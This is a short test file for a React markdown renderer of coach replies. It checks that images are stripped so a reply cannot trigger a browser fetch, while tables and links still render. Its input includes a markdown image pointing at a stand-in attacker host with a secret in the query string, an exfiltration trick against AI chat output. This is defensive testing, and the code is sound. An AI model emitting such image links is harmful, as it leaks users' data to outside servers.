import assert from "node:assert/strict";
import { test } from "node:test";

import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "react-markdown";

import { REPLY_MARKDOWN } from "./reply.ts";

test("a coach reply never renders an image, so it cannot make the browser fetch an address", () => {
  const html = renderToStaticMarkup(createElement(Markdown, REPLY_MARKDOWN, "Done.\n\n![x](https://evil.example/p.gif?d=SECRET)\n\n| a |\n|---|\n| b |\n\n[a lesson](https://example.org)"));
  assert.ok(!/<img|evil\.example/.test(html), html);
  assert.match(html, /<table>/); // GFM still works.
  assert.match(html, /<a href="https:\/\/example\.org">a lesson<\/a>/);
});
